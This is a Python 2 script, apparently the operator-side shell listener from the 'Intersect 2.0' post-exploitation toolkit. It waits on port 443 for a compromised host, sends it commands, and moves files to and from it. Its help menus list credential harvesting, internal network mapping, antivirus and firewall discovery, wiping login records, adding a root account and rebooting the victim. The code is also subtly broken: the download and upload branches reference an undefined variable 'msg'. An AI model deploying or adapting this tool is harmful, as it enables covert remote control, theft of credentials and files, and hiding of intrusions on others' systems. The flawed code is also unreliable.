#!/usr/bin/python

# Intersect 2.0
# TCP Shell Listener
# https://github.com/ohdae/Intersect-2.0

import os, sys
import socket
from subprocess import Popen,PIPE,STDOUT,call

HOST = ''
PORT = 443
socksize = 4096

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

try:
    server.bind((HOST, PORT))
    server.listen(10)
    print "[+] Shell listening on 443"
    conn, addr = server.accept()
    print "[+] New Connection: %s" % addr[0]
except:
    print "[!] Connection closed."
    sys.exit(2)

while True:
    data = conn.recv(socksize)
    cmd = raw_input(data)
    conn.sendall(str(cmd))
    if cmd == ('killme'):
        print("[!] Shutting down shell!")
        conn.close()
        sys.exit(0)
    elif cmd.startswith('download'):
        getname = msg.split(" ")
        rem_file = getname[1]
        filename = rem_file.replace("/","_")
        data = conn.recv(socksize)
        newfile = file(filename, "wb")
        newfile.write(data)
        newfile.close()
        if os.path.exists(filename) is True:
            print("[+] Download complete.")
            print("[+] File location: " + os.getcwd()+"/"+filename)
    elif cmd.startswith('upload'):
	getname = msg.split(" ")
        loc_file = getname[1]
        sendfile = open(loc_file, "r")
        filedata = sendfile.read()
        sendfile.close()
        conn.sendall(filedata)
    elif cmd == ("extask"):
        print("   extask help menu    ")
        print("extask osinfo      | gather os info")
        print("extask livehosts   | maps internal network")
        print("extask credentials | user/sys credentials")
        print("extask findextras  | av/fw and extras")
        print("extask network     | ips, fw rules, connections, etc")
        print("extask scrub       | clears 'who' 'w' 'last' 'lastlog'")
    elif cmd == ("helpme"):
        print(" Intersect Shell | Help Menu")
        print("---------------------------------")
        print(" download <file>  | download file from host")
        print(" upload <file>    | upload file to host")
        print(" extask <task>    | run Intersect tasks")
	print(" httproxy         | HTTP proxy on 8080")
        print(" adduser <name>   | add new root account")
        print(" rebootsys        | reboot remote host system")
        print(" helpme           | display this menu")
        print(" killme           | shuts down shell connection\n")
        print("* If the shell appears to hang after sending or receiving data, press [enter] and it should fix the issue.")



conn.close()

